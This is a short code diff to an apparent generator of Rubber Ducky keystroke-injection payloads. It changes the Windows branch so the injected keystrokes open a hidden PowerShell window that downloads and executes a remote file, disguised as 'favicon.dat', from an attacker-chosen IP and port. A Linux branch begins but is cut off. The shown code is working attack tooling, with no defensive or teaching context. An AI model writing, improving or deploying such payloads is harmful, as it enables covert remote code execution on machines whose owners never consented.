@@ -7,9 +7,10 @@ def generate_ducky(ip, port, delay_ms, output_path, os_type):
         ducky = f"""DELAY {delay_ms}
 GUI r
 DELAY 400
-STRING mshta http://{ip}:{port}/decrypt.html
+STRING powershell -WindowStyle Hidden -nop -c "iex(iwr -UseBasicParsing http://{ip}:{port}/favicon.dat)"
 ENTER
 """
+
     elif os_type == 'linux':
         ducky = f"""DELAY {delay_ms}
 CTRL ALT t
